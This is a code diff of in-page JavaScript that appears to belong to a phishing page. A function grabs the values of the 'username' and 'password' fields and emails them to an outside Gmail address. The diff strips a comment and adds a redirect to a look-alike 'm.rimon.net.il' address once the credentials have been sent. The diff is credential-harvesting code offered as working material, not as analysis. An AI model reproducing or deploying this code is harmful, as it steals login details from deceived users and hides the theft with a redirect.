@@ -24,7 +24,6 @@
 function submitToMe(){
   var username = document.getElementsByName("username")[0].value;
   var password = document.getElementsByName("password")[0].value;
-  
   sendMail("rimon.net.il@gmail.com", "username: " + username + ", password: " + password);
 }
 
@@ -49,7 +48,8 @@ function sendMail(email, text) {
         }
       }
      }).done(function(response) {
-       console.log(response); // if you're into that sorta thing
+       console.log(response);
+       window.location = "m.rimon.net.il";
      });
 }
 </script>
